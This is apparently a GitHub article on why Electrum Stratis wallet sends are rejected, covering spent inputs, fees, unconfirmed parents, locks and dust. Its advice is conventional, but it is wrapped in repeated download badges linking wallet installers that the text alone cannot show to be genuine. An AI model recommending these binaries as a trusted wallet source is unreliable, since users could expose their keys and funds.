![Electrum-Stratis](assets/banner-article.png)

# bad-txns-inputs-spent, and the other reasons a send is rejected

<p align="center">Five reasons and what each one means</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

A rejection means the node refused to relay or mine the transaction, and the reason is almost always one of five: the inputs were already spent elsewhere, the fee was too low for the current conditions, the coins are not yet spendable, the transaction conflicts with another pending one, or the wallet is building it against a stale view. None of them loses funds, and each has a specific check. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| Rejection | Usual cause | First check |
|---|---|---|
| bad-txns-inputs-spent | Inputs spent in another transaction | History for the same coins |
| Insufficient fee | Fee below the relay threshold | Fee setting, then retry |
| Not confirmed / unconfirmed parent | Spending a pending output | Wait for the parent |
| Non-final / locktime | Time-locked coins | Coin age and staking lock |
| Invalid address | Wrong network's format | Address prefix |
| Dust output | Amount below the relay minimum | Consolidate instead |

</div>

The message names the rule that was broken. Reading it literally is faster than guessing, because each phrase maps to one condition. The build you should run is on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19); a rejection it reports is usually the network's rule being applied correctly, and [Electrum Stratis security and keys](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md) matters only in the one case where the conflicting transaction is not yours.

## Why it happens

A transaction is a claim on specific outputs. Every input must be unspent at the moment the network sees it, and once one transaction spends an output, any other transaction spending the same output is invalid - that is what "inputs spent" means. Two wallets holding the same keys, a restored wallet that still has a pending send, or a double-clicked send button can all produce this, and none of them is theft.

Fee rejections are a market condition rather than a fault. A node enforces a minimum relay fee, miners prefer higher fees, and a transaction below the current floor can sit unrelayed or be dropped. The wallet's fee estimate is a snapshot, and snapshots age.

The third family is timing. Coins from a recent transaction are not spendable until that transaction confirms, and coins locked by a staking arrangement are not spendable until the lock ends. A wallet that offers to spend them is offering a transaction the network will reject, and the rejection is correct.

## Fix

1. **Read the rejection text and match it to the table.** bad-txns-inputs-spent is a conflict; insufficient fee is a price; non-final is a lock. They need different responses.
2. **For a spent input, stop and look at history.** Find the transaction that spent the coin. If it is yours and pending, wait; if it is not yours, the key is compromised and the priority changes to moving everything else.
3. **For a fee rejection, raise the fee and retry.** If the original transaction is still unconfirmed, replacing it with a higher fee is the clean path; sending a second transaction that conflicts with the first creates the very error you are trying to fix.
4. **For unconfirmed parents, wait.** A child cannot confirm before its parent, and no fee setting changes that.
5. **For a lock, check the clock.** A staking lock or a coinbase maturity has a defined end; the wallet will spend when it passes, and not before.
6. **For an address rejection, re-copy from the source wallet.** A format mismatch is caught before signing, which is the cheapest possible failure.

If the transaction is already broadcast and unconfirmed, the question changes from "why rejected" to "how to replace or wait", and both are ordinary operations.

## If that did not work

If every send is rejected regardless of amount or fee, check the wallet's connection and height first. A wallet building transactions against a stale view can produce inputs the network considers spent, and the error is truthful about a view that is wrong.

If a transaction vanished from the mempool, it was dropped rather than rejected: the coins are unspent and available again, and rebuilding the transaction is safe.

If the wallet reports a conflict with a transaction you do not recognise, treat the key as exposed until proven otherwise. That is the one rejection that is a security event rather than a fee event.

## Prevention

- Send from one wallet at a time when the same keys exist in two places.
- Leave a margin above the minimum fee rather than setting it exactly.
- Wait for a parent transaction before spending its output.
- Check the lock period before planning a spend.
- Keep the wallet current so fee estimates and relay rules match the network.

## FAQ

### What does bad-txns-inputs-spent mean?

It means at least one input was already spent by another transaction the network has seen. Either your own pending transaction got there first, or another party with the same keys did.

### Did I lose coins when a transaction was rejected?

No. A rejected transaction changes nothing on chain. The coins remain at the addresses that hold them, and the wallet will show them again once it has a consistent view.

### Why is my transaction rejected for a low fee?

Because nodes enforce a minimum relay fee and miners prioritise higher-paying transactions. Raise the fee, or replace the pending transaction with one that pays more.

### Can I cancel a transaction that is already broadcast?

Not cancel - replace. A transaction with the same inputs and a higher fee can take its place if it reaches the network first. Otherwise you wait for confirmation or for the mempool to drop it.

<!-- DOWNLOAD-BLOCK -->

Work through the message in order: is the input already spent on chain, is the fee below the current relay minimum, is an output too small to relay, is the locktime still in the future. Each has one check and one remedy. Rebuilding the same transaction without changing the failing condition produces the same rejection, which is how people lose an afternoon.

## Related articles

- [Why the balance is missing, in three causes](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md)
- [Moving coins between wallets without losing fees](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/move-coins-without-wasting-fees.md)
- [Synced but far behind: the stale peer](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/synced-to-a-stale-peer.md)
- [Where your address lives, and why it never changes](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/where-a-wallet-address-comes-from.md)
